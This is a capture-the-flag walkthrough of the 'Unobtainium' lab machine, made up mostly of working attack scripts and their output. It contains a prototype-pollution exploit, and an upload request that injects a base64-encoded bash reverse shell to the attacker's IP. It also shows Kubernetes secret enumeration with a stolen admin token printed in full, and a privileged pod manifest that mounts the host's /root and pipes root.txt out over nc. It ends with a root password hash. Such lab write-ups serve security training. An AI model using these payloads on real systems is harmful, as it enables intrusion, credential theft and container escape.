# Unobtainium

IP : 10.10.10.235
OS -> Linux

````bash
echo "10.10.10.235 Unobtainium.htb" >> /etc/hosts 
````

Nmap 
nmap -sC -sV -p- unobtainium.htb

|Port|Service|
|---|---|
|22|ssh|
|80|http|
|2379|ssl/etcd-client|
|2380|ssl/etcd-server|
|8443|https|
|10250|https|
|31337|http|

### port 80
Simple html page. 

where we can download their program called unobtainium, let download it and see if we can learn anything from it. 

unpack the files, inside the files you will find opt/unobtainium/unobtainium program which is theirc chat software. 

The "TODO" tap describe furture functions
{"ok":true,"content":"1. Create administrator zone.\n2. Update node JS API Server.\n3. Add Login functionality.\n4. Complete Get Messages feature.\n5. Complete ToDo feature.\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\n7. Improve security\n"}

The Post messages allow you to post messages. but to where, lets see if the system make a connection to anything. 
````bash
netstat -antp
#Output 
tcp        1      0 10.10.14.200:46798      10.10.10.235:31337      CLOSE_WAIT  2613/unobtainium -- 
````

And we see that it makes a connection to port 31337 node js service

go to http://unobtainium.htb:31337/ and you will see our text message. 
and it by the user felamos. why are we allready auth?

To get a better idea of what is happend with the packages lets start up wireshark. 
use filter ip.addr == 10.10.10.235 to cut out the noise. 

![[Pasted image 20210506124830.png]]

Look at the HTTP/JSON package 

````json
JavaScript Object Notation: application/json
    Object
        Member Key: auth
            Object
                Member Key: name
                    String value: felamos
                    Key: name
                Member Key: password
                    String value: Winter2021
                    Key: password
            Key: auth
        Member Key: filename
            String value: todo.txt
            Key: filename
````

And we got the cred for felamos the user we posted message as. 
Creds : felamos/Winter2021

It first tried it on ssh service and it did not work, would also be to easy. 

Startup burp so we can catch the request and send it to repeater
And you can now start search for files. 
a common web files is the inde.js let try that, and we got a hit, it in a very ugly format, but it hold nothing of interest. We know it a nodejs service lets see if we get the packages that is installed. 
search for package.json
lodash can be used to give us the options to upload and delete files.
and google-cloudstorage-commds for RCE. 

first start by giving us the ability to upload files. 
install
```bash
apt-get install jq
```

Exploit for giving us the ability to upload files
exploit.sh
```bash
#!/bin/bash

RHOST="unobtainium.htb"
RPORT=31337
UA="Mozilla/5.0"
TEXT='{"constructor":{"prototype":{"canDelete":true, "canUpload":true}}}'

cat - <<EOF > message.json
{
    "auth":
    {
        "name":"felamos",
        "password":"Winter2021"
    },
    "message":
    {
        "text":${TEXT}
    }
}
EOF

curl -s \
     -X PUT \
     -A "${UA}" \
     -H "Content-Type: application/json" \
     -d "$(cat message.json | jq -c)" \
     "http://${RHOST}:${RPORT}/" \
| jq .
```

run the script 
```bash
./exploit.sh
```

we now have the ability to write in a file.

let make a reverse shell script 

rev.sh
```bash
#!/bin/bash

RHOST="unobtainium.htb"
RPORT=31337
UA="Mozilla/5.0"
FILE="& echo $(echo 'bash -i >& /dev/tcp/10.10.14.200/8754 0>&1' | base64) | base64 -d | bash"

cat - <<EOF > message.json
{
    "auth":
    {
        "name":"felamos",
        "password":"Winter2021"
    },
    "filename":"${FILE}"
}
EOF

curl -s \
     -A "${UA}" \
     -H "Content-Type: application/json" \
     -d "$(cat message.json | jq -c)" \
     -o /dev/null \
     "http://${RHOST}:${RPORT}/upload"
```

start a listner 

````bash
nc -lvnp 8754
````

and we got the user txt. 
notices we are root but inside a docker container we have to try and escape. 

privileged container check 
````bash
ip link add dummy0 type dummy
````
Nope we have to find another way.

There no kubectl in the container to be found, lets start by uploading on. 
[Install kubectl binary with curl on Linux](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux)

create a python server 
````bash
python3 -m http.server 8080
````

Download the fil using wget
````bash
wget http://10.10.14.200:8080/kubeclt -O /tmp/kubeclt
````

Are we get privileged resources.
```php
 /tmp/akubectl auth can-i list secrets
no
```

check namespaces
```php
/tmp/akubectl auth can-i list namespaces
Warning: resource 'namespaces' is not namespace scoped
yes
```

List namespaces get the namespace of the other containers
```php
/tmp/akubectl get namespace 
NAME              STATUS   AGE
default           Active   90d
dev               Active   89d
kube-node-lease   Active   90d
kube-public       Active   90d
kube-system       Active   90d
```

Lets check our permission in pods that are not in dev container
```bash
root@webapp-deployment-5d764566f4-mbprj:/# /tmp/akubectl auth can-i list pods -n dev
yes
root@webapp-deployment-5d764566f4-mbprj:/# /tmp/kkubectl get pods -n dev            
NAME                                READY   STATUS    RESTARTS   AGE
devnode-deployment-cd86fb5c-6ms8d   1/1     Running   28         89d
devnode-deployment-cd86fb5c-mvrfz   1/1     Running   29         89d
devnode-deployment-cd86fb5c-qlxww   1/1     Running   29         89d
```

The way kubernetes cluster works by having one or more nodes, each of these nodes have one or more pods. Each pods can have one or more container. 
and we learn there are three pods with a container running

And we see in the previous command there is three Pods each with a running containere in the dev namespace.

Let's list the description of the pod.

````bash
/tmp/kkubectl describe pod/devnode-deployment-cd86fb5c-6ms8d -n dev
````

Output

```bash
Name:         devnode-deployment-cd86fb5c-6ms8d
Namespace:    dev
Priority:     0
Node:         unobtainium/10.10.10.235
Start Time:   Sun, 17 Jan 2021 18:16:21 +0000
Labels:       app=devnode
              pod-template-hash=cd86fb5c
Annotations:  <none>
Status:       Running
IP:           172.17.0.10
IPs:
  IP:           172.17.0.10
Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c
Containers:
  devnode:
    Container ID:   docker://e4ee0a519753f7fcb91e9a8051a4f682d674713c6350e730c9e9ee82c0c0f8cb
    Image:          localhost:5000/node_server
    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c
    Port:           3000/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Fri, 07 May 2021 05:11:29 +0000
    Last State:     Terminated
      Reason:       Error
      Exit Code:    137
      Started:      Wed, 24 Mar 2021 16:01:28 +0000
      Finished:     Wed, 24 Mar 2021 16:02:13 +0000
    Ready:          True
    Restart Count:  28
    Environment:    <none>
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)
Conditions:
  Type              Status
  Initialized       True 
  Ready             True 
  ContainersReady   True 
  PodScheduled      True 
Volumes:
  default-token-rmcd6:
    Type:        Secret (a volume populated by a Secret)
    SecretName:  default-token-rmcd6
    Optional:    false
QoS Class:       BestEffort
Node-Selectors:  <none>
Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:          <none>
```



We are looking at two `different` environments, the classic production `environment` and the development `environment`. I should be able to repeat the steps i just have to make the `RHOST` and `RPORT` variables and upload them to the container I’m `currently` in above to get another foothold in the `development` environment.

For that we need to `forward` the port to the devnode-deployment container `"172.17.0.4:3000"`

I am using `Chisel` for that, a tcp/upd tunnel written in go.

if you do not have go installed 
````bash
apt install golang-go
````


````bash
git clone https://github.com/jpillora/chisel.get
cd chisel 
go build
````

transfer the new file onto the box

````bash
./chisels client 10.10.14.200:9999 R:3000:172.17.0.10:3000
````

We have now created a connection to box. 

Time to give us permission to delete and upload.
exploit.sh
```bash
#!/bin/bash

RHOST=$1
RPORT=$2
UA="Mozilla"
TEXT='{"constructor":{"prototype":{"canDelete":true, "canUpload":true}}}'


cat - <<EOF > message.json
{
    "auth":
    {
        "name":"felamos",
        "password":"Winter2021"
    },
    "message":
    {
        "text":${TEXT}
    }
}
EOF

curl -s \
     -X PUT \
     -A "${UA}" \
     -H "Content-Type: application/json" \
     -d "$(cat message.json | jq -c)" \
     "http://${RHOST}:${RPORT}/" \
| jq .
```

I modified by rev.sh script to take to input ip and port and the port for reverse port.

rev.sh
````bash
#!/bin/bash

RHOST=$1
RPORT=$2
UA="Mozilla/5.0"
FILE="& echo $(echo "bash -i >& /dev/tcp/10.10.14.200/"$3" 0>&1" | base64) | base64 -d | bash"


cat - <<EOF > message.json
{
    "auth":
    {
        "name":"felamos",
        "password":"Winter2021"
    },
    "filename":"${FILE}"
}
EOF

curl -s \
     -A "${UA}" \
     -H "Content-Type: application/json" \
     -d "$(cat message.json | jq -c)" \
     -o /dev/null \
     "http://${RHOST}:${RPORT}/upload"

````

it now takes 3 parmaters RHOST RPORT and LPORT
````bash
./rev.sh 172.0.0.1 3000 8080
````
transfer kubectl again with wget to see if we can gain any information like secrets. 

````bast
wget http://10.10.14.200/kubectl -O /tmp/kubectl 
/tmp/kubectl auth can-i list secrets -n kube-system

Yes
````
yey we have permission let get them secrets. 

````bash
/tmp/kubectl get secrets -n kube-system
````
output
````ouput
attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      110d
bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      110d
c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      109d
certificate-controller-token-thnxw               kubernetes.io/service-account-token   3      110d
clusterrole-aggregation-controller-token-scx4p   kubernetes.io/service-account-token   3      110d
coredns-token-dbp92                              kubernetes.io/service-account-token   3      110d
cronjob-controller-token-chrl7                   kubernetes.io/service-account-token   3      110d
daemon-set-controller-token-cb825                kubernetes.io/service-account-token   3      110d
default-token-l85f2                              kubernetes.io/service-account-token   3      110d
deployment-controller-token-cwgst                kubernetes.io/service-account-token   3      110d
disruption-controller-token-kpx2x                kubernetes.io/service-account-token   3      110d
endpoint-controller-token-2jzkv                  kubernetes.io/service-account-token   3      110d
endpointslice-controller-token-w4hwg             kubernetes.io/service-account-token   3      110d
endpointslicemirroring-controller-token-9qvzz    kubernetes.io/service-account-token   3      110d
expand-controller-token-sc9fw                    kubernetes.io/service-account-token   3      110d
generic-garbage-collector-token-2hng4            kubernetes.io/service-account-token   3      110d
horizontal-pod-autoscaler-token-6zhfs            kubernetes.io/service-account-token   3      110d
job-controller-token-h6kg8                       kubernetes.io/service-account-token   3      110d
kube-proxy-token-jc8kn                           kubernetes.io/service-account-token   3      110d
namespace-controller-token-2klzl                 kubernetes.io/service-account-token   3      110d
node-controller-token-k6p6v                      kubernetes.io/service-account-token   3      110d
persistent-volume-binder-token-fd292             kubernetes.io/service-account-token   3      110d
pod-garbage-collector-token-bjmrd                kubernetes.io/service-account-token   3      110d
pv-protection-controller-token-9669w             kubernetes.io/service-account-token   3      110d
pvc-protection-controller-token-w8m9r            kubernetes.io/service-account-token   3      110d
replicaset-controller-token-bzbt8                kubernetes.io/service-account-token   3      110d
replication-controller-token-jz8k8               kubernetes.io/service-account-token   3      110d
resourcequota-controller-token-wg7rr             kubernetes.io/service-account-token   3      110d
root-ca-cert-publisher-token-cnl86               kubernetes.io/service-account-token   3      110d
service-account-controller-token-44bfm           kubernetes.io/service-account-token   3      110d
service-controller-token-pzjnq                   kubernetes.io/service-account-token   3      110d
statefulset-controller-token-z2nsd               kubernetes.io/service-account-token   3      110d
storage-provisioner-token-tk5k5                  kubernetes.io/service-account-token   3      110d
token-cleaner-token-wjvf9                        kubernetes.io/service-account-token   3      110d
ttl-controller-token-z87px                       kubernetes.io/service-account-token   3      110d
/tmp/kubectl describe secrets/c-admin-token-tfmp2 -n kube-system
````

look that the third options is says admin which is the secret of the cluster administrator. let get their token/secret

````bash
/tmp/kubectl describe secrets/c-admin-token-tfmp2 -n kube-system
````
output
remember the token output will be different from mine

````ouput
Name:         c-admin-token-tfmp2
Namespace:    kube-system
Labels:       <none>
Annotations:  kubernetes.io/service-account.name: c-admin
              kubernetes.io/service-account.uid: 2463505f-983e-45bd-91f7-cd59bfe066d0

Type:  kubernetes.io/service-account-token

Data
====
ca.crt:     1066 bytes
namespace:  11 bytes
token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow

````

Can we get some information about the token
```php
root@devnode-deployment-cd86fb5c-qlxww:/tmp# /tmp/kubectl --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow cluster-info
````
output
````ouput
<579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow cluster-info
Kubernetes control plane is running at https://10.96.0.1:443
KubeDNS is running at https://10.96.0.1:443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy

To further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.
````

And last let see if we are allowed to create pods. 
```bash
root@devnode-deployment-cd86fb5c-qlxww:/tmp# /tmp/kubectl --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow auth can-i create pod
````
output
````ouput
yes
````

We are allows to create pods, lets create a pod where we are allowed everything. 

[Bad Pod #1: Everything allowed](https://github.com/BishopFox/badPods/tree/main/manifests/everything-allowed)

 [everything-allowed-exec-pod.yaml](https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml)

badpod.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: some-pod
  namespace: default
spec:
  containers:
    - name: web
      image: localhost:5000/dev-alpine
      command: ["/bin/sh"]
      args: ["-c", 'cat /root/root.txt | nc -nv 10.10.14.200 9005; sleep 100000']
      volumeMounts:
      - mountPath: /root/
        name: root-flag
  volumes:
  - hostPath:
      path: /root/
      type: ""
    name: root-flag
```

transfer the yaml file with wget

````bash
wget http://10.10.14.200/badpod.yaml
````

On your host machine create a netcat listner
````bash
nc -lvnp 9005 > root.txt
````

```bash
/tmp/kubectl create -f /tmp/badpod.yaml --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
```

and we got root. 

Hash -> $6$.hk3Zm.2qShoCbQK$LM95a1qtDhEtLPGorD8FmMY5pNef7WfodyUUaw9tikXkh8v/.qmhJPIEV40KYehroJybb4C12gLfQu0UsbFe80

[https://0xdedinfosec.github.io/posts/htb-unobtainium/](https://0xdedinfosec.github.io/posts/htb-unobtainium/)